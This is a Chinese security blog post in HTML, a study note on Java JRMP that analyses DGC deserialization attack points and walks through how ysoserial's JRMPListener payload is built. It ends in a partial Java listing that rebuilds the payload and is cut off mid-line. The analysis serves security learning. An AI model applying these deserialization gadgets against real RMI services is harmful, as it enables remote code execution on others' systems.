@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/index.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/index.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/index.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fupanc.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Java JRMP学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JRMP">
+<meta property="og:url" content="https://fupanc.github.io/2024/10/07/JRMP/index.html">
+<meta property="og:site_name" content="Fupanc">
+<meta property="og:description" content="Java JRMP学习">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240927172339150.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240927172524021.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240923190713637.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240923224715297.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240923224933807.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240923225344632.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240923225612924.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240923225901678.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925121155638.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925121410236.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925121506392.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925182620717.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925132805531.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925125941900.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925130426444.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925130945824.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925131244319.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925131818831.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925133252277.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925133544877.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925133612251.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925133846470.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925134346792.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925134610603.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925134908045.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925135012514.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925181429982.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925185328966.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925193427586.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925193519219.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925193915244.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925195637853.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925195839152.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925200251084.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925201946802.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925203438998.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925203740413.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925204103272.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925204423753.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925204635729.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925215655280.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925220541032.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240925215655280.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240927185604839.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240927185913450.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240927190529663.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240927172524021.png">
+<meta property="article:published_time" content="2024-10-07T12:17:21.843Z">
+<meta property="article:modified_time" content="2024-10-07T12:19:08.361Z">
+<meta property="article:author" content="Fupanc">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fupanc.github.io/2024/10/07/JRMP/image-20240927172339150.png">
+
+
+<link rel="canonical" href="https://fupanc.github.io/2024/10/07/JRMP/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://fupanc.github.io/2024/10/07/JRMP/","path":"2024/10/07/JRMP/","title":"JRMP"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>JRMP | Fupanc</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Fupanc" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Fupanc</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Fupanc's blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JRMP"><span class="nav-number">1.</span> <span class="nav-text">JRMP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DGCImpl-Stub%E5%92%8CDGCImpl-Skel"><span class="nav-number">1.2.</span> <span class="nav-text">DGCImpl_Stub和DGCImpl_Skel</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ysoserial%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="nav-number">1.3.</span> <span class="nav-text">ysoserial程序分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-JRMPListener"><span class="nav-number">1.3.1.</span> <span class="nav-text">payload&#x2F;JRMPListener</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ysoserial%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">ysoserial流程分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-JRMPClient"><span class="nav-number">1.3.2.</span> <span class="nav-text">payload&#x2F;JRMPClient</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exploit-JRMPListener"><span class="nav-number">1.3.3.</span> <span class="nav-text">exploit&#x2F;JRMPListener</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exploit-JRMPClient"><span class="nav-number">1.3.4.</span> <span class="nav-text">exploit&#x2F;JRMPClient</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-1"><span class="nav-number">1.3.5.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB"><span class="nav-number">1.4.</span> <span class="nav-text">攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%EF%BC%88%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%89%93%E6%9C%8D%E5%8A%A1%E7%AB%AF%EF%BC%89"><span class="nav-number">1.5.</span> <span class="nav-text">第一种攻击方式（客户端打服务端）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">1.5.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E6%94%BB%E5%87%BB%E7%82%B9"><span class="nav-number">1.5.2.</span> <span class="nav-text">主要攻击点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E5%B1%80%E9%99%90"><span class="nav-number">1.5.3.</span> <span class="nav-text">小局限</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%EF%BC%88%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%89%93%E5%AE%A2%E6%88%B7%E7%AB%AF%EF%BC%89"><span class="nav-number">1.6.</span> <span class="nav-text">第二种攻击方式（服务端打客户端）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="nav-number">1.6.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E6%94%BB%E5%87%BB%E7%82%B9-1"><span class="nav-number">1.6.2.</span> <span class="nav-text">主要攻击点</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Fupanc"
+      src="/images/123.jpg">
+  <p class="site-author-name" itemprop="name">Fupanc</p>
+  <div class="site-description" itemprop="description">志之难也，不在胜人，在于自胜</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">38</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Fupanc" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Fupanc" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:fupanc.vivo50@gmail.com" title="E-Mail → mailto:fupanc.vivo50@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://fupanc.github.io/2024/10/07/JRMP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/123.jpg">
+      <meta itemprop="name" content="Fupanc">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Fupanc">
+      <meta itemprop="description" content="志之难也，不在胜人，在于自胜">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="JRMP | Fupanc">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          JRMP
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-10-07 20:17:21 / 修改时间：20:19:08" itemprop="dateCreated datePublished" datetime="2024-10-07T20:17:21+08:00">2024-10-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java%E5%AE%89%E5%85%A8/Java%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">Java基础</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java%E5%AE%89%E5%85%A8/Java%E5%9F%BA%E7%A1%80/JRMP/" itemprop="url" rel="index"><span itemprop="name">JRMP</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>9.3k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>17 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>Java JRMP学习</p>
+<span id="more"></span>
+
+<h1 id="JRMP"><a href="#JRMP" class="headerlink" title="JRMP"></a>JRMP</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Java Remote Method Protocol，Java远程方法协议。</p>
+<p>用于查看和引用远程对象的协议，是运行在RMI之下，TCP&#x2F;IP之上的线路层协议。</p>
+<h2 id="DGCImpl-Stub和DGCImpl-Skel"><a href="#DGCImpl-Stub和DGCImpl-Skel" class="headerlink" title="DGCImpl_Stub和DGCImpl_Skel"></a>DGCImpl_Stub和DGCImpl_Skel</h2><p>前面在RMI的学习中，基本都是围绕RegistryImpl_Stub和RegistryImpl_Skel来尝试攻击，在RMI学习中还提到了一个攻击方式：DGC。</p>
+<p>通过DGCImpl来实现攻击的也有两种，DGCImpl_Stub#dirt（服务端攻击客户端），还有DGCImpl_Skel#dispatch（客户端攻击服务端），简单说明一下这两个方法存在的漏洞：</p>
+<ul>
+<li>DGCImpl_Skel#dispatch()：</li>
+</ul>
+<p>存在switch&#x2F;case（分别为clean()和dirty()），以clean()为例：<br><img src="/2024/10/07/JRMP/image-20240927172339150.png" alt="image-20240927172339150"></p>
+<p>存在反序列化的点。</p>
+<ul>
+<li>DGCImpl_Stub#dirt()：<br><img src="/2024/10/07/JRMP/image-20240927172524021.png" alt="image-20240927172524021"></li>
+</ul>
+<p>也是很熟悉的代码了，这里的invoke()方法起传输数据的作用。存在反序列化的点。这里就可以存在服务端打客户端，当然也可以客户端打服务端，毕竟客户端传输数据过去后服务端也是会反序列化数据的，点其实也就在于前面说的DGCImpl_Skel#dispatch()方法处。</p>
+<p>现在简单通过ysoserial来学习一下。</p>
+<h2 id="ysoserial程序分析"><a href="#ysoserial程序分析" class="headerlink" title="ysoserial程序分析"></a>ysoserial程序分析</h2><p>在ysoserial中有exploit模块和payload模块，每个模块下都有JRMPClient和JRMPListener的脚本。现在来分析一下。</p>
+<p>就简单看看ysoserial项目，主要还是自己测试，测试环境：</p>
+<ul>
+<li>JDK 8U71</li>
+</ul>
+<h3 id="payload-JRMPListener"><a href="#payload-JRMPListener" class="headerlink" title="payload&#x2F;JRMPListener"></a>payload&#x2F;JRMPListener</h3><p>给了调用链，反序列化UnicastRemoteObject类。一般情况下，远程对象会继承这个类，用来创建远程对象的代理类。</p>
+<p>跟进一下UnicastRemoteObject#readObject()方法：</p>
+<p><img src="/2024/10/07/JRMP/image-20240923190713637.png" alt="image-20240923190713637"></p>
+<p>调用了reexport()方法，跟进这个方法：</p>
+<p><img src="/2024/10/07/JRMP/image-20240923224715297.png" alt="image-20240923224715297"></p>
+<p>这里会调用exportObject()方法，和之前RMI的远程对象创建分析很像，也是会调用UnicastRemoteObject#exportObject()方法，跟进一下这里的exportObject()方法（可以看到现在的参数分别为UnicastRemoteRef和0）：</p>
+<p><img src="/2024/10/07/JRMP/image-20240923224933807.png" alt="image-20240923224933807"></p>
+<p>还是实例化了一个UnicastServerRef类实例，大概流程和前面RMI是差不多的。只不过这里传入的obj是UnicastRemoteObject类实例：</p>
+<ul>
+<li>简单提一下UnicastServerRef类的实例化：</li>
+</ul>
+<p><img src="/2024/10/07/JRMP/image-20240923225344632.png" alt="image-20240923225344632"></p>
+<p>就是将UnicastServerRef类的父类UnicastRef的ref变量赋值为了LiveRef类实例。</p>
+<ul>
+<li>继续跟进调用的exportObject()方法：</li>
+</ul>
+<p><img src="/2024/10/07/JRMP/image-20240923225612924.png" alt="image-20240923225612924"></p>
+<p>大概流程还是差不多，直接到关键点：<br><img src="/2024/10/07/JRMP/image-20240923225901678.png" alt="image-20240923225901678"></p>
+<p>不同的是这里传入的var1是UnicastRemoteObject类实例。</p>
+<p>然后这里还是创建了一个RemoteObjectInvocationHandler代理。代理对象还是UnicastRef类。</p>
+<p>然后封装进了Target类，然后调用了UnicastServerRef类的父类的ref变量，即会调用LiveRef类的exportObject()方法并传入了封装的Target类实例：<br><img src="/2024/10/07/JRMP/image-20240925121155638.png" alt="image-20240925121155638"></p>
+<p>后续流程还是差不多的，然后调用了TCPEndpoint类的exportObject()方法：<br><img src="/2024/10/07/JRMP/image-20240925121410236.png" alt="image-20240925121410236"></p>
+<p>然后就调用到了TCPTransport类的exportObject()方法：</p>
+<p><img src="/2024/10/07/JRMP/image-20240925121506392.png" alt="image-20240925121506392"></p>
+<p>这里里会调用listen()方法，也是前面说过的，当调用了这个方法后，会指定端口开启监听。</p>
+<p>这里的<code>super.exportObject()</code>方法同样的是将这个Target对象放进ObjectTable中。</p>
+<h4 id="ysoserial流程分析"><a href="#ysoserial流程分析" class="headerlink" title="ysoserial流程分析"></a>ysoserial流程分析</h4><p><strong>回到ysoserial项目中</strong>，先看一个继承关系（后面会说）：<br><img src="/2024/10/07/JRMP/image-20240925182620717.png" alt="image-20240925182620717"></p>
+<p>ysoserial的重要代码如下：<br><img src="/2024/10/07/JRMP/image-20240925132805531.png" alt="image-20240925132805531"></p>
+<p>这里的Reflections类是项目自定义的类，<strong>先跟进这里的createWithConstructor()方法</strong>（注意参数的传递）：</p>
+<p><img src="/2024/10/07/JRMP/image-20240925125941900.png" alt="image-20240925125941900"></p>
+<p>简单说一说这个过程：</p>
+<ol>
+<li>先获取RemoteObject.class类的构造器，这里这里也是指定了参数类型（RemoteRef.class），也就是如下构造函数：</li>
+</ol>
+<p><img src="/2024/10/07/JRMP/image-20240925130426444.png" alt="image-20240925130426444"></p>
+<p>所以这里是获取到了这个构造方法。</p>
+<p>2.然后又调用了ReflectionFactory类的getReflectionFactory()方法，跟进一下：</p>
+<p><img src="/2024/10/07/JRMP/image-20240925130945824.png" alt="image-20240925130945824"></p>
+<p>一般System.getSecurityManager()方法的结果都是null，所以这里会直接返回这个类变量soleInstance，变量定义如下：<br><img src="/2024/10/07/JRMP/image-20240925131244319.png" alt="image-20240925131244319"></p>
+<p>也就是说返回了一个ReflectionFactory类实例。</p>
+<p>3.回到createWithConstructor()方法，所以现在又调用了ReflectionFactory类的newConstructorForSerialization()方法（传入的参数分别为ActivationGroupImpl.class、前面获取到的Constructor）：</p>
+<p><img src="/2024/10/07/JRMP/image-20240925131818831.png" alt="image-20240925131818831"></p>
+<p>这里会调用Constructor类的getDeclaringClass()方法，方法源代码如下：<br><img src="/2024/10/07/JRMP/image-20240925133252277.png" alt="image-20240925133252277"></p>
+<p>所以这里就是直接返回的clazz对象（即Remote.class）。</p>
+<p>很明显不是ActivationGroupImpl.class，所以会调用到后面的generateConstructor()方法：</p>
+<p><img src="/2024/10/07/JRMP/image-20240925133544877.png" alt="image-20240925133544877"></p>
+<p><img src="/2024/10/07/JRMP/image-20240925133612251.png" alt="image-20240925133612251"></p>
+<p>最后返回的还是这个RemoteObject类的构造方法。</p>
+<p>4.最后回到了Reflections类的createWithConstructor()方法：<br><img src="/2024/10/07/JRMP/image-20240925133846470.png" alt="image-20240925133846470"></p>
+<p>现在就是对这个RemoteObject类进行实例化。需要注意的是这里传入的参数consArs就是前面的UnicastServerRef类的实例：</p>
+<p><img src="/2024/10/07/JRMP/image-20240925134346792.png" alt="image-20240925134346792"></p>
+<p>也就就是说我这里实例化了一个UnicastServerRef类实例，并往里面传入了123端口。</p>
+<p>简单过一遍这里的UnicastServerRef类的实例，也就是指定了端口为123，都是大差不差的，赋值情况如下：</p>
+<p><img src="/2024/10/07/JRMP/image-20240925134610603.png" alt="image-20240925134610603"></p>
+<p>这里也就是将UnicastServerRef类的父类UnicastRef的ref变量设置为了一个LiveRef类实例（传入的var1是123），再简单看看这里的LiveRef类的变量情况：<br><img src="/2024/10/07/JRMP/image-20240925134908045.png" alt="image-20240925134908045"></p>
+<p>——————</p>
+<p>现在就直接来看RemoteObject类的实例：<br><img src="/2024/10/07/JRMP/image-20240925135012514.png" alt="image-20240925135012514"></p>
+<p>但是对这个构造方法调用newInstance()方法，这里的<code>sc.newInstance(consArgs);</code>会<strong>获得ActivationGroupImpl对象</strong>：</p>
+<p><img src="/2024/10/07/JRMP/image-20240925181429982.png" alt="image-20240925181429982"></p>
+<p>它记录了类和父类的所用属性（可以简单地把它当做我们想要利用的UnicastRemoteObejct类实例，因为这个实例包含了父类的属性）。</p>
+<p>ref属性对应位于RemoteObject类完整代码：</p>
+<p><img src="/2024/10/07/JRMP/image-20240925185328966.png" alt="image-20240925185328966"></p>
+<p>获取到ActivationGroupImpl对象后，向上转型就能获取到UnicastRemoteObject。</p>
+<p>本地实现的完整代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JRMP.payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.ActivationGroupImpl;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastServerRef;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPListener</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">123</span>;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor1</span> <span class="operator">=</span> RemoteObject.class.getDeclaredConstructor();</span><br><span class="line">        constructor1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor2</span> <span class="operator">=</span> ReflectionFactory.getReflectionFactory().newConstructorForSerialization(ActivationGroupImpl.class, constructor1);</span><br><span class="line">        constructor2.setAccessible(<span 